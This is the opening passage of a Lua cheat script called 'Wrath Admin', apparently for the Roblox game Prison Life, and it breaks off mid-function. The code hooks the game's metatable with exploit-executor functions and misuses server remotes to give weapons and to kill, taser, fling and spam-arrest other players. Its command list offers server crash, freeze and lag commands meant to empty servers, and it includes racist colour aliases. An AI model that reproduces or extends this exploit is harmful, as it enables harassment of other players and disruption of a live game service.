--https://github.com/Sploiter13/Wrath-Admin-Prison-Life-Script/blob/main/Wrath%20Admin.txt
local ExecutionTime = tick();

------- MAIN SCRIPT -------
-- Wrath Admin by Zyrex, Dis, and Midnight
-- Use /e <Command> to silently use commands

-- Use /console or F9 or Fn + F9 when you say cmds



------------------------------------------------------------------------
--   _    _______  ___ _____ _   _    ___ _________  ________ _   _   --
--  | |  | | ___ \/ _ \_   _| | | |  / _ \|  _  \  \/  |_   _| \ | |  --
--  | |  | | |_/ / /_\ \| | | |_| | / /_\ \ | | | .  . | | | |  \| |  --
--  | |/\| |    /|  _  || | |  _  | |  _  | | | | |\/| | | | | . ` |  --
--  \  /\  / |\ \| | | || | | | | | | | | | |/ /| |  | |_| |_| |\  |  --
--   \/  \/\_| \_\_| |_/\_/ \_| |_/ \_| |_/___/ \_|  |_/\___/\_| \_/  --
------------------------------------------------------------------------

-- Load Game:
if not game:IsLoaded() then
    repeat
        task.wait(0.03);
    until game:IsLoaded()
end;

-- Script:
local Players = game:GetService("Players");
local Teams = game.Teams;
local TeleportService = game:GetService("TeleportService")
local rService = game:GetService("RunService");
local rStorage = game:GetService("ReplicatedStorage");
local UserInputService = game:GetService("UserInputService");
local CoreGui = game:GetService("CoreGui");
local HttpService = game:GetService("HttpService");
local TweenService = game:GetService("TweenService");
local RegionModule = require(game.ReplicatedStorage["Modules_client"]["RegionModule_client"]);
local TooltipModule = require(game.ReplicatedStorage.Modules_client.TooltipModule);
local LocalPlayer = Players.LocalPlayer;
local Mouse = LocalPlayer:GetMouse();

local Settings = {Prefix = ".", ToggleGui = "RightControl"};
local ProtectedSettings = {tpcmds = true, killcmds = true, arrestcmds = true, givecmds = true, othercmds = true};
local AdminSettings = {tpcmds = true, killcmds = true, arrestcmds = true, givecmds = true, othercmds = true};
local OpenCommandBarKey = "Period";
local States = {
    AutoRespawn = false;
    AntiCriminal = false;
    AntiBring = false;
    ArrestAura = false;
    AntiFling = false;
    AutoInfiniteAmmo = false;
    AutoAutoFire = false;
    AntiPunch = false;
    MeleeAura = false;
    CombatLogs = false;
    ShootBack = false;
    TaseBack = false;
    FriendlyFire = false;
    PunchAura = false;
    SpamPunch = false;
    OnePunch = false;
    OneShot = false;
    ClickTeleport = false;
    AntiCrash = false;
    FastPunch = false;
    AutoTeamChange = true;
	Kcf = false;
    Rb = false;
    Rgb = false;
};

--// Tables:
local AmmoGuns = {};
local Walls = {};
local SavedWaypoints = {};
local Admins = {};
local Trapped = {};
local CommandQueue = {};
local ChatQueue = {};
local Loopkilling = {};
local Infected = {};
local KillAuras = {};
local LoopTasing = {};
local TaseAuras = {};
local Protected = {};
local WhitelistedItems = {};
local ArmorSpamFlags = {};
local MeleeKilling = {};
local SpeedKilling = {};
local Nukes = {};
local ClickTeleports = {};
local Oneshots = {};
local Onepunch = {};
local AntiShoots = {};
local TaseBacks = {};
local ArrestFlags = {};

local Info = {FriendlyFireOldTeam = LocalPlayer.TeamColor.Name, ExecutionTime = tick(), Bullets = 0};

local PunchFunction;
local CurrentlyViewing;
local SavedPosition = CFrame.new();
local SavedCameraPosition = CFrame.new();
local Camera = workspace.CurrentCamera;
local HasBeenArrested = false;

local MT = getrawmetatable(game);
local IndexMT = MT.__index;
local __Namecall = MT.__namecall;
local NewIndex = MT.__newindex

setreadonly(MT, false);

-- Reload:
function UnloadScript()
    print("UNLOADING WRATH ADMIN...");

    -- Tables:
    AmmoGuns = {};
    Walls = {};
    Trapped = {};
    CommandQueue = {};
    ChatQueue = {};
    Admins = {};
    Trapped = {};
    PunchFunction = {};
    Loopkilling = {};
    Infected = {};
    KillAuras = {};
    WhitelistedItems = {};
    ArmorSpamFlags = {};

    -- Locals:
    PunchFunction = nil;
    CurrentlyViewing = nil;
    SavedPosition = CFrame.new();
    SavedCameraPosition = CFrame.new();

    task.wait(1/10);

    for i, State in next, States do
        State = false;
    end;
    for i, Setting in next, ProtectedSettings do
        Setting = true;
    end;
    for i, Setting in next, AdminSettings do
        Setting = true;
    end;

    local ListGui = CoreGui:FindFirstChild("CMDList");
    local CommandBarGui = CoreGui:FindFirstChild("WrathCommandBar");
 
    if ListGui then
        ListGui:Destroy();
    end;
    if CommandBarGui then
        CommandBarGui:Destroy();
    end;
end;

if getgenv().WrathLoaded then
    UnloadScript();
else
    getgenv().WrathLoaded = true;
end;

-- Spawn Points
pcall(function()
    local File = readfile("WrathAdminSavedWayPoints.json");
    SavedWaypoints = HttpService:JSONDecode(File);
end);

-- Walls:
for i,v in pairs(workspace:GetDescendants()) do
    local Lower = v.Name:lower();
    if (Lower:find("wall") or Lower:find("building") or Lower:find("fence") or Lower:find("gate") or Lower:find("window") or Lower:find("glass") or Lower:find("outline") or Lower:find("accent")) and (v:IsA("BasePart") or v:IsA("Model")) then
        Walls[#Walls+1] = v;
    end;
end;

local Commands = {
    "Made by Zyrex, Dis, and Midnight";
    "TIP: -- press '.' to open the command bar.";
    "cmds -- shows this";
    "output -- shows the output";
    "=== TELEPORTS ===";
    "goto / to [plr] -- teleports you to plr";
    "bring [plr] -- teleports plr to you";
    "lb / loopbring [plr,all] -- loop brings plr/all to you";
    "nexus / nex [plr] -- teleports plr to nexus";
    "yard / yar [plr] -- teleports plr to yard";
    "back / bac [plr] -- teleports plr to back nexus";
    "tower / tow / twr [plr] -- teleports plr to tower";
    "base / cbase /  [plr] -- teleports plr to crim base";
    "cafe [plr] -- teleports plr to cafe";
    "cells / cel [plr] -- teleports to cells";
    "border [plr] -- teleports to board";
    "1v1 [plr] -- teleports to 1v1 place";
    "mcd -- teleports you back to macdonalds";
    "macdonalds / mac / mc -- teleports you to macdonalds";
    "kitchen / kit [plr] -- teleports to kitchen"; 
    "cbr [plr] -- teleports to criminal base roof";
    "sewer / sew / swr [plr] -- teleport to sewer ";
    "hr2 [plr] -- teleports to houses roof 2";
    "mcw [plr] -- teleports to middle criminal wharehouse";
    "lcw [plr] -- teleports to last criminal wharehouse";
    "nspawn [plr] -- teleport to neautral spawn";
    "hr [plr] -- teleports to houses roof";
    "houses  [plr] -- teleports to houses";
    "shr [plr] -- teleports to small house roof";
    "smallhouse / sh  [plr] -- teleports to small house";
    "apr [plr] -- teleports to apartments";
    "shopsroof / sr2 [plr] -- teleports to shop roof";
    "storeroof / sr [plr] -- teleports to storeroof";
    "hidingspot / hs [plr] -- teleports to hiding spot";
    "secret  [plr] -- teleports to secret";
    "store [plr] -- teleports to store";
    "gas [plr] -- teleports to gas station";
    "shops [plr] -- teleports to shops ";
    "shops2  [plr] -- teleports to 2nd shops";
    "pwrline / powerline [plr] -- teleports to power line";
    "office [plr] -- teleports to office";
    "gate [plr] -- teleports to gate";
    "gatetwr / gt [plr] -- teleports to gate tower";
    "cellroof [plr] -- teleports to cell roof";
    "roof [plr] -- teleports to roof";
    "safe [plr] -- teleports to safe";
    "vent [plr] -- teleports to vent";
    "tp [plr] [plr2] -- teleports plr to plr2";
    "trap [plr] -- traps plr";
    "dumpster / scorp [plr] -- teleports to dumpster";
    "toilet [plr] -- teleports to toilet";
    "snack [plr] -- teleports to vending machine";
    "flag [plr] -- teleports to flag";
    "untrap [plr] untraps plr";
    "void [plr] -- teleports plr to void";
    "towaypoint / tw [name] -- teleports to a certain spawnpoint";   
    "wp / setwaypoint [name] -- set spawnpoint where you stand ";   
    "dwp / delwaypoint [name] -- remove spawnpoint";
    "getwpnames / getwaypointnames -- gets waypoint names";
    "clwp -- clears waypoints";
    "=== KILL CMDS ===";
    "kill [plr] / kill guards, inmates, criminals -- kills a player, team, or all";
    "mkill [plr] -- melee kill player or all";
    "vkill [plr] -- void kill player (kills them by sending them to the void)";
    "nuke / kamikaze [plr] -- turns plr into a nuke";
    "defuse / unnuke [plr] -- removes nuke from plr";
    "tase [plr,all] -- tase a player or all";
    "lk [plr,all,inmates,guards,criminals] -- loopkills plr/team/all";
    "unlk [plr,all,inmates,guards,criminals] -- stops loopkill";
    "mlk [plr,all] -- melee loopkil plr/all";
    "unmlk [plr,all] -- unmelee loopkill plr/all";
    "slk [plr,team,all] -- speed loopkill plr/team/all";
    "unslk [plr,team,all] -- stop speed loopkill plr/team/all";
    "clk / clearloopkills -- clears loopkill tables (EVERY LOOPKILL INCLUDING TEAMKILLS)";
    "getlk / getloopkills -- gets all players who are being loopkilled";
    "aura / ka [plr] -- kill aura plr or all";
    "unka / unaura [plr] -- removes kill aura from player or all";
    "virus / infect [plr] -- gives virus to a player (touch kill)";
    "rvirus / unvirus [plr]";
    "ta / taseaura [plr] -- gives plr tase aura";
    "getv / getinfected -- gets all currently infected players";
    "getk / getkillauras -- gets all players that have a kill aura";
    "getlt / getlooptase -- gets all players that are being loop tased";
    "getmlk / getmeleeloopkill -- gets all players that are being melee loop killed";
    "lt [plr,all] -- loop tase plr or all";
    "unlt [plr,all] -- stops loop tase plr or all";
    "sp / spampunch -- toggles spam punch (your punches will be really fast if you hold down F)";
    "pa / punchaura -- toggles punch aura (your punches have more range)";
    "op / onepunch [plr] -- toggles one punch (your punches will insta kill)";
    "os / oneshot [plr] -- toggles one shot for plr";
    "shootback / sb [plr] -- shoot back plr (when they get shot the person who shot them dies)";
    "tb / taseback [plr] -- tase back plr (when they get shot the person who shot them gets tased)";
    "clv -- clear virus";
    "clka -- clear kill auras";
    "clt -- clear loop tase";
    "clos -- clear one shots";
    "clsb / clearshootback -- clears shoot back";
    "cltb / cleartaseback -- clears tase back";
    "atc / autoteamchange -- toggles auto team change (changes your team if whoever you are killing is on the same team as you, true by default)";
    "shock / fence [plr] -- kills player with fence ";
    "fridge [plr] -- teleports player to the fidge ";
    "=== GIVE ITEMS ===";
    "armor -- gives armor (requires riot gamepass | only works on you)";
    "shield [plr] -- gives plr riot shield";
    "cuffs / handcuffs [plr] -- gives handcuffs to player";
    "giveshotty / shotty [plr] -- gives plr shotgun";
    "giveak / ak [plr] -- gives plr ak47";
    "givem9 / m9 [plr] -- gives plr m9";
    "givem4 / m4 [plr] -- gives plr m4a1";
    "givehammer / hammer [plr] -- gives plr hammer";
    "giveknife / knife [plr] -- gives plr knife";
    "givekey / key [plr] -- gives plr keycard";
    "givehandcuffs / handcuffs [plr] -- gives plr handcuffs";
    "givetaser / taser [plr] -- gives plr taser";
    "=== GUN COMMANDS ===";
    "aguns -- auto give gun";
    "unaguns -- stop auto give gun";
    "gun / guns -- gives guns (one time)";
    "af / autofire -- disables semi auto guns (m9) || taser isn't affected :(";
    "aaf / autoaf -- automatically enables autofire every time you respawn";
    "ia / infammo -- emables infinite ammo";
    "aia / autoinfammo -- automatically enables infinite ammo every time you respawn";
    "ffire / friendlyfire -- toggles friendly fire on/off";
    "oneshot / os [plr] -- one shot gun";
    "kcf -- auto gives keycard";
    "unkcf -- turns kcf off";
    "rb -- rainbow bullets";
	"unrb -- turns off rainbow bullets";
    "=== ARREST ===";
    "sa [plr] -- spam arrest plr";
    "unsa / breaksa -- breaks spam arrest";
    "arrest / ar [plr,all] [number] -- arrests player with specified number of arrests (defaults to 1 if not specified)";
    "aa / arrestaura -- arrest aura";
    "csa / crashsa -- short put powerful spam arrest";
    "=== OTHER ===";
    "getinvis / getinv -- get invisible players";
    "geta / getarmorspammers -- (gets armor spammers)";
    "fps / antilag / boost -- Make game FPS faster (Depends on your computer on how much faster it'll be, but nonetheless it will work!)";
    "crim / cr [plr] -- turns plr into criminal";
    "team / t [color / guards / inmates / criminals / rgb] -- change team";
    "rgb -- turns rainbow team on";
    "unrgb -- turns rainbow team off";
    "rejoin / rj -- makes you rejoin the server";
    "auto -- toggle auto respawn";
    "view [plr] -- view plr";
    "unview -- unview plr";
    "getteam [plr] -- gets the players team";
    "annoy [plr] -- repeatedly walks up to the player and punches them";
    "unannoy -- stops annoying the plr";
    "logspam / ls -- spams logs";
    "unlogspam / unls -- stops log spam";
    "meleeaura / ma -- melee aura";
    "prefix [new prefix] -- changes chat prefix to new prefix";
    "exit / fuckoff -- unloads the script";
    "god -- you cant die";
    "ungod -- disables god";
    "clogs / combatlogs -- toggles combat logs (NOT ACCURATE AGAINST EXPLOITERS / YOU NEED TO DISABLE ANTICRASH TO USE THIS)";
    "getd / getdef -- gets all defense states";
    "getstates / gets -- gets current states";
    "btools -- gives you btools";
    "noclip -- allows you to walk through walls";
    "clip -- disables noclip";
    "ff / forcefield -- enables ff";
    "unff / unforcefield -- disables ff";
    "ctp / clicktp -- clicktp plr";
    "clctp -- clears click teleports";
    "hop -- server hop";
    "ct / copyteam [plr] -- copy team of plr";
    "gs / gunspin -- guns will spin around you";
    "sarmor / spamarmor [strength] -- armor spam";
    "unsarmor / unspamarmor -- stops armor spam";
    "lpunch / loudpunch -- makes your punches loud";
    "=== FLING ===";
    "fling [plr] -- Flings player (lowest fling)";
    "unfling -- break fling";
    "sfling [plr] -- Super flings player";
    "unsfling -- break sfling";
    "bfling [plr] -- Body flings player (For Godded players, NET bypass doesn't count!)";
    "unbfling -- breaks bfling";
    "getflings / getf -- gets invisible flingers";
    "=== COLOR TEAMS ===";
    "caucasian / white -- white";
    "blood / red -- red";
    "africa / black -- black";
    "blue";
    "raid";
    "pink";
    "lime -- green";
    "toothpaste -- cyan";
    "yellow";
    "gold";
    "grey";
    "pink / dis";
    "mid / lime -- Lime Green";
    "mint / shottyt";
    "poop -- brown";
    "copyteam [plr] -- copies a plr's team [use again to disable]";
    "=== DEFENSE ===";
    "ac / anticrim -- stops you from becoming criminal";
    "ab / antibring -- stops you from being bring (deletes tools)";
    "afling / antifling -- stops you from being flung";
    "ap / antipunch -- kills players that punch you";
    "anticrash / acrash -- disables bullet replication / makes you immune to crash scripts (disables/enables .clogs, .sb, .tb, .ctp, .os) || disabled by default";
    "def / defenses -- enables all defenses";
    "undef / undefenses -- disables all defenses";
    "=== MAP ===";
    "nodoors -- removes doors";
    "doors / redoors -- restores doors";
    "walls -- restores wall";
    "nowalls -- removes walls";
    "=== PROTECTION COMMANDS ===";
    "p / protect [plr] -- protects a player";
    "up / unprotect [plr] -- revokes a player's protection";
    "clp / clearprotected -- revokes every protected player";
    "getp / getprotected -- view all protected";
    "psettings / ps -- [killcmds/tpcmds/arrestcmds/givecmds/othercmds/karma] [true, immune / false, not immune]";
    "getps / getprotectedsettings -- gets all current configuration settings for protected players";
    "=== LAG COMMANDS ===";
    "rip / crash -- completely shits on the server";
    "sc / softcrash -- freezes everyone's screen but keeps the server alive, best way to empty servers";
    "lag [strength] -- lags server with strength indefinitely";
    "unlag -- stops lag";
    "timeout -- kills server, doesnt freeze people's screens";
    "=== COMMANDS FOR RANKED ===";
    "admin [plr,all] -- admins a player or all";
    "unadmin [plr] -- revokes admin access from player";
    "getadmins -- gets all admins";
    "cla / clearadmins -- clears all admins";
    "asettings / as -- [killcmds/tpcmds/arrestcmds/givecmds/othercmds] [true, cmd enabled / false, cmd disabled]";
    "getas / getadminsettings -- gets all current configuration settings for ranked players";
    "=== GUI COMMANDS ===";
    "gui / guis -- toggle gui";
    "bindgui / guikeybind [keycode] (eg. 'G' or 'LeftAlt' or 'One') -- keybind for gui";
}

local CustomColors = {
    ["caucasian"] = {255, 255, 255}; -- White
    ["white"] = {255, 255, 255}; -- White
    ["blood"] = {255, 0, 0}; -- Red
    ["red"] = {255, 0, 0}; 
    ["africa"] = {0, 0, 0}; -- Black
    ["black"] = {0, 0, 0}; -- Black
    ["blue"] = {0, 17, 201};
    ["raid"] = {176, 5, 255};
    ["pink"] = {255, 0, 187};
    ["lime"] = {0, 252, 8}; -- Green
    ["toothpaste"] = {0, 255, 242}; -- Cyan
    ["yellow"] = {242, 250, 0};
    ["gold"] = {237, 167, 14};
    ["grey"] = {111, 110, 112};
    ["poop"] = {59, 41, 0}; -- Brown
    ["dis"] = {224, 178, 208}; -- Pink
    ["pink"] = {224, 178, 208};
    ["Darkside"] = {17, 17, 17}; -- Really Black
    ["juan"] = {196, 40, 28}; -- Bright Red
    ["monse"] = {151, 0, 0}; -- Crimson
    ["Mint"] = {177, 229, 166};
}

local PauseChecks;

function SavePos(POS)
    pcall(function()
        POS = POS or LocalPlayer.Character.Head.CFrame;
    end);
    
    if POS and LocalPlayer.Character then
        SavedPosition = POS;
        SavedCameraPosition = Camera.CFrame;
    end;
end;

function LoadPos()
    if SavedPosition and LocalPlayer.Character then
        if LocalPlayer.Character.PrimaryPart then
            LocalPlayer.Character:SetPrimaryPartCFrame(SavedPosition);
            rService.RenderStepped:wait();
            Camera.CFrame = SavedCameraPosition;
        end;
    end;
end;

function CheckWhitelisted(ITEM)
    for i,v in next, WhitelistedItems do
        if v == ITEM then
            return true;
        end;
    end;
    return false;
end;

function Notify(Title, Text, Duration)
    game.StarterGui:SetCore("SendNotification", {
        Title = Title;
        Text = Text;
        Icon = "";
        Duration = Duration;
    })
    AddLog(Title, Text);
end;

function WhitelistItem(ITEM)
    WhitelistedItems[#WhitelistedItems+1] = ITEM;
end;

function GetRegion(Player)
    if Player then
        if Player.Character then
            if RegionModule.findRegion(Player.Character) then
                return RegionModule.findRegion(Player.Character)["Name"]
            end;
        end;
    end;
end;

function IllegalRegion(Player)
    local Permitted = rStorage.PermittedRegions
    for i,v in pairs(Permitted:GetChildren()) do
        if GetRegion(Player) == v.Value then
            return false;
        end;
    end;
    return true;
end;

function ArrestEvent(PLR, TIMES)
    pcall(function()
        TIMES = TIMES or 1;
        if States.SpamArresting then
            for i = 1, TIMES do
                if not States.SpamArresting or not PLR or not Players:FindFirstChild(PLR.Name) then
                    break
                end;
                task.spawn(function()
                    workspace.Remote.arrest:InvokeServer(PLR.Character:FindFirstChildWhichIsA("Part"));
                end);
                task.wait(0.03)
            end;
        else
            for i = 1, TIMES do
                task.spawn(function()
                    workspace.Remote.arrest:InvokeServer(PLR.Character:FindFirstChildWhichIsA("Part"));
                end);
                pcall(function()
                    LocalPlayer.Character.Humanoid.Sit = false;
                end);
                if PLR.TeamColor.Name ~= "Really red" or not IllegalRegion(PLR) or not Players:FindFirstChild(PLR.Name) then
                    break
                end;
                rService.RenderStepped:wait();
            end;
        end;
    end);
end;

function Arrest(PLR, TIMES)
    pcall(function()
        if TIMES > 1 then
            local STOP = false;
            task.spawn(function()
                task.wait(1/5  + TIMES / 10)
                STOP = true
            end);
            while true do
                LocalPlayer.Character.Humanoid.Sit = false;
                LocalPlayer.Character:SetPrimaryPartCFrame(PLR.Character.Head.CFrame * CFrame.new(0, 0, 1));
                coroutine.wrap(ArrestEvent)(PLR, TIMES);
                if STOP or PLR.TeamColor.Name ~= "Really red" or not Players:FindFirstChild(PLR.Name) then
                    break
                end;
                rService.RenderStepped:wait();
            end
        else
            pcall(function()
                LocalPlayer.Character.Humanoid.Sit = false;
                LocalPlayer.Character:SetPrimaryPartCFrame(PLR.Character.Head.CFrame * CFrame.new(0, 0, 1));
                task.wait(0.15);
                coroutine.wrap(ArrestEvent)(PLR, 15);
            end);
        end;
    end);
end;

function YieldUntilScriptLoaded(SCRIPT)
    while task.wait(0.03) do
        local SUCCESS, ERROR = pcall(getsenv, SCRIPT);
        if SUCCESS then
            break
        end;
    end;
end;

function MeleeEvent(PLR)
    rStorage.meleeEvent:FireServer(PLR);
end;

function CheckProtected(Player, index)
    if Player then
        return not Protected[Player.UserId] or (Protected[Player.UserId] and ProtectedSettings[index] == false)
    end;
end;

function ItemHandler(ITEM)
    workspace.Remote.ItemHandler:InvokeServer(ITEM);
    pcall(function()
        WhitelistItem(LocalPlayer.Backpack:FindFirstChild(ITEM.Parent.Name));
    end);
end;

function TeamEvent(COLOR)
    workspace.Remote.TeamEvent:FireServer(COLOR);
end;

function Loadchar(COLOR)
    if LocalPlayer.TeamColor.Name == "Medium stone grey" then
        if COLOR == nil or COLOR == "Medium stone grey" then
            Info.LoadingNeutralChar = true
            workspace.Remote.loadchar:InvokeServer(LocalPlayer.Name, "Really black");
            TeamEvent("Medium stone grey");
            Info.LoadingNeutralChar = false;
        else
            workspace.Remote.loadchar:InvokeServer(LocalPlayer.Name, COLOR);
        end;
    else
        workspace.Remote.loadchar:InvokeServer(LocalPlayer.Name, COLOR);
    end;
end;

function CheckOwnedGamepass()
    return game:GetService("MarketplaceService"):UserOwnsGamePassAsync(LocalPlayer.UserId, 96651);
end;

function Chat(Message)
    ChatQueue[#ChatQueue+1] = function()
        rStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Message, "All");
    end;
end;

function ModGun(Tool)
    local GS = Tool:WaitForChild("GunStates", 1);
    if GS then
        if States.AutoInfiniteAmmo then
            local Stats = require(GS);
            Stats.MaxAmmo = math.huge;
            Stats.CurrentAmmo = math.huge;
            Stats.AmmoPerClip = math.huge;
            Stats.StoredAmmo = math.huge;
            AmmoGuns[#AmmoGuns+1] = Tool;
        end;
        if States.AutoAutoFire then
            local Stats = require(GS);
            Stats.AutoFire = true;
        end;
    end
end;

function GiveGuns()
    if CheckOwnedGamepass() then
        ItemHandler(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
        ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)
        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        if workspace.Prison_ITEMS.single:FindFirstChild("Key card") then
            ItemHandler(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP);
        end;
    else
        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
        ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP);
        ItemHandler(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP);
        if workspace.Prison_ITEMS.single:FindFirstChild("Key card") then
            ItemHandler(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP);
        end;
    end;
end;

function Crim(Player, isSpamArrest)
    pcall(function()
        local SpawnLocation = game.Lighting:FindFirstChild("SpawnLocation");
        PauseChecks = true;
        SavePos();
        local SavedTeam = LocalPlayer.TeamColor.Name;
        Loadchar();
        if isSpamArrest then
            LoadPos();
        else
            LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 0.75));
            task.spawn(function()
                rService.RenderStepped:wait();
                Camera.CFrame = SavedCameraPosition;
            end)
        end;
        SpawnLocation.Transparency = 1;
        SpawnLocation.Anchored = true;
        SpawnLocation.CanCollide = false;
        local CHAR = LocalPlayer.Character;
        CHAR.Humanoid.Name = "1";
        local c = CHAR["1"]:Clone();
        c.Name = "Humanoid";
        c.Parent = CHAR;
        CHAR["1"]:Destroy();
        Workspace.CurrentCamera.CameraSubject = CHAR;
        CHAR.Animate.Disabled = true;
        task.wait(0.03);
        CHAR.Animate.Disabled = false;
        CHAR.Humanoid.DisplayDistanceType = "None";
        ItemHandler(workspace.Prison_ITEMS.single["Hammer"].ITEMPICKUP);
        if not LocalPlayer.Backpack:FindFirstChild("Hammer") then
            ItemHandler(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
        end
        local tool = LocalPlayer.Backpack:FindFirstChild("Hammer") or LocalPlayer.Backpack:FindFirstChild("M9")
        WhitelistItem(tool);
        tool.Parent = CHAR;
        local STOP = 0;
        LoadPos()
        repeat
            STOP = STOP + 1;
            if isSpamArrest then
                LoadPos()
                Player.Character:SetPrimaryPartCFrame(LocalPlayer.Character.Head.CFrame * CFrame.new(0, 0, -0.75));
            else
                LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 0.75));
            end;
            if Player.TeamColor.Name == "Really red" then
                break
            end;
            firetouchinterest(Player.Character.Head, SpawnLocation, 0);
            task.wait(0.03);
        until (not LocalPlayer.Character:FindFirstChild(tool.Name) or not LocalPlayer.Character or not Player.Character) and STOP > 3;
        task.wait(1/5)
        Loadchar(SavedTeam);
        LoadPos();
    end)
end;

function Give(Player, TOOL, GIVER, TEAM, SPAWNED, DISABLESAVELOADPOS)
    PauseChecks = true;
    pcall(function()
        if Player == LocalPlayer then
            if not SPAWNED then
                if not GIVER then
                    ItemHandler(workspace.Prison_ITEMS.single[TOOL].ITEMPICKUP);
                else
                    local SavedTeam = LocalPlayer.TeamColor.Name;
                    if TOOL == "Riot Shield" then
                        SavePos();
                        if #Teams.Guards:GetChildren() > 8 then
                            Loadchar("Bright blue");
                        else
                            TeamEvent("Bright blue");
                        end;
                    end;
                    ItemHandler(workspace.Prison_ITEMS.giver[TOOL].ITEMPICKUP);
                    if TOOL == "Riot Shield" then
                        if SavedTeam == "Bright orange" or SavedTeam == "Medium stone grey" then
                            TeamEvent(SavedTeam);
                        else
                            Loadchar(SavedTeam)
                        end;
                        LoadPos();
                    end;
                end
            end;
        else
            if not DISABLESAVELOADPOS then
                SavePos();
            end;
            local SavedTeam = LocalPlayer.TeamColor.Name;
            Loadchar(TEAM);
            if not SPAWNED then
                if not GIVER then
                    ItemHandler(workspace.Prison_ITEMS.single[TOOL].ITEMPICKUP);
                else
                    ItemHandler(workspace.Prison_ITEMS.giver[TOOL].ITEMPICKUP);
                end
            end;
            --LocalPlayer.Character.HumanoidRootPart.Anchored = true;
            local CHAR = LocalPlayer.Character;
            CHAR.Humanoid.Name = "1";
            local c = CHAR["1"]:Clone();
            c.Name = "Humanoid";
            c.Parent = CHAR;
            CHAR["1"]:Destroy();
            Workspace.CurrentCamera.CameraSubject = CHAR;
            CHAR.Animate.Disabled = true;
            task.wait(0.03);
            CHAR.Animate.Disabled = false;
            CHAR.Humanoid.DisplayDistanceType = "None";
            local tool = LocalPlayer.Backpack:FindFirstChild(TOOL);
            WhitelistItem(tool);
            tool.Parent = CHAR;
            local STOP = 0;
            repeat
                STOP = STOP + 1;
                LocalPlayer.Character:SetPrimaryPartCFrame(Player.Character.Head.CFrame * CFrame.new(0, 0, 0.75));
                task.wait(0.03);
            until (not LocalPlayer.Character:FindFirstChild(TOOL) or not LocalPlayer.Character or not Player.Character or STOP > 500) and STOP > 3;
            --LocalPlayer.Character.HumanoidRootPart.Anchored = false;
            if not DISABLESAVELOADPOS then
                if Player ~= LocalPlayer then
                    Loadchar(SavedTeam);
                else
                    if SavedTeam == "Bright orange" or SavedTeam == "Medium stone grey" then
                        TeamEvent(SavedTeam);
                    end;
                end;
                LoadPos();
            end;
        end;
    end);
end;

function Keycard(Player)
    pcall(function()
        States.GivingKeycard = true;
        local PICKUP = workspace.Prison_ITEMS.single;
        local SavedTeam = LocalPlayer.TeamColor.Name
        SavePos();
        if not PICKUP:FindFirstChild("Key card") then
            while task.wait(0.03) do
                LocalPlayer.Character.Humanoid.Health = 0;
                task.wait(1/10)
                Loadchar("Bright blue")
                if PICKUP:FindFirstChild("Key card") then
                    break
                end;
            end;
        end;
        if Player == LocalPlayer then
            Loadchar(SavedTeam);
            ItemHandler(workspace.Prison_ITEMS.single["Key card"].ITEMPICKUP);
        else
            Give(Player, "Key card", false, nil, nil, true);
            Loadchar(SavedTeam)
        end;
        LoadPos();
        task.wait(1/5);
        States.GivingKeycard = false;
    end);
end;

function EditStat(GUN, Stat, Value)
    pcall(function()
        local Stats = require(GUN.GunStates);
        Stats[Stat] = Value;
    end);
end;

function AddToQueue(Function)
    CommandQueue[#CommandQueue+1] = Function;
end;

function Kill(PLAYERS)
    local Events = {};

    for i,v in next, PLAYERS do
        if v.Character then
            if v.TeamColor == LocalPlayer.TeamColor and not States.AntiCriminal and States.AutoTeamChange then
                SavePos();
                Loadchar(BrickColor.random().Name);
                LoadPos();
            end;
            for i = 1, 15 do
                Events[#Events + 1] = {
                    Hit = v.Character:FindFirstChildOfClass("Part");
                    Cframe = CFrame.new();
                    RayObject = Ray.new(Vector3.new(), Vector3.new());
                    Distance = 0;
                };
            end;
        end;
    end;

    ItemHandler(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP);

    pcall(function()
            
        local Gun = LocalPlayer.Backpack:FindFirstChild("Remington 870") or LocalPlayer.Character:FindFirstChild("Remington 870")
        if not Gun then
            ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
            Gun = LocalPlayer.Backpack:FindFirstChild("AK-47") or LocalPlayer.Character:FindFirstChild("AK-47")
        end;
        WhitelistItem(Gun);
        task.spawn(function()
            for i = 1, 5 do
                rStorage.ReloadEvent:FireServer(Gun);
                task.wait(1/2);
            end;
        end);

        rStorage.ShootEvent:FireServer(Events, Gun)
    end);
end;

function Tase(PLAYERS)
    local Events = {};

    for i,v in next, PLAYERS do
        if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
            if v.Character and v.TeamColor.Name ~= "Bright blue" then
                Events[#Events + 1] = {
                    Hit = v.Character:FindFirstChildOfClass("Part");
                    Cframe = CFrame.new();
                    RayObject = Ray.new(Vector3.new(), Vector3.new());
                    Distance = 0;
                };
            end;
        end;
    end;

    pcall(function()
        if not LocalPlayer.Backpack:FindFirstChild("Taser") and not States.AutoTeamChange then
            SavePos();
            Loadchar("Bright blue");
            LoadPos();
        end;
        local Gun = LocalPlayer.Backpack:FindFirstChild("Taser") or LocalPlayer.Character:FindFirstChild("Taser")
        WhitelistItem(Gun);
        task.spawn(function()
            for i = 1, 5 do
                rStorage.ReloadEvent:FireServer(Gun);
                task.wait(1/2);
            end;
        end);

        rStorage.ShootEvent:FireServer(Events, Gun)
    end);
end;

local function FixScreen()
    for i = 1, 10 do
        pcall(function()
            LocalPlayer.PlayerGui.Home.intro.Visible = false
            LocalPlayer.PlayerGui.Home.hud.Visible = true
            Camera.FieldOfView = 70
            game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
            Camera.CameraType = Enum.CameraType.Custom
            Camera.CameraSubject = LocalPlayer.Character.Humanoid
            LocalPlayer.Character.HumanoidRootPart.Anchored = false;
            LocalPlayer.Character.Torso.Anchored = false;
        end);
